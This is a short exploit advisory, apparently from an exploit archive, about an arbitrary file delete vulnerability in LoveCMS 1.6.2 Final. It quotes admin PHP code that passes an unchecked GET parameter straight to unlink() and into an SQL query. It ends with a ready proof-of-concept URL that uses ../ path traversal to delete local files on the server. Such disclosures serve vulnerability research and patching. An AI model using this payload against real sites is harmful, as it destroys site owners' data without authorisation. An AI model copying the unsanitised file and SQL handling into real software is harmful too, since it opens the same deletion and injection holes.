LoveCMS 1.6.2 Final Arbitrary File Delete Vulnerability
=======================================================


+-------------------------------------------------------------------------------------------------------+
|													|
|	Name		:	LoveCMS 1.6.2 Final Arbitrary File Delete Vulnerability			|
|	Author		:	cOndmened								|
|	Details		:	Ofc, we can only delete files from places that we have permission	|
|				to access x]								|
|													|
+-------------------------------------------------------------------------------------------------------+


source of/lovecms/system/admin/images.php

	41.	if($_GET[&#039;delete&#039;])

	42.	{

	43.		$filename = $_GET[&#039;delete&#039;];

	44.		$sql = $db -> db_query("DELETE FROM " . DB_PREFIX . "images 

	45.		WHERE filename = &#039;$filename&#039;");

	46.	

	47.		unlink(LOVE_ROOT . &#039;/uploads/&#039; . $filename);

	48.		unlink(LOVE_ROOT . &#039;/uploads/thumbs/&#039; . $filename);

	49.

	50.		redirect_with_message(&#039;msg&#039;, &#039;LANG_088&#039;);

	51.	}



Description :

	41.	name of file to delete is being sended using GET method in variable called &#039;delete&#039;
	47.	here the requested file is being erased
		
		rest of the code block doesn&#039;t matters

Proof of concept :

	http://[host]/[loveCMS-path]/system/admin/images.php?delete=../../../[local-file]




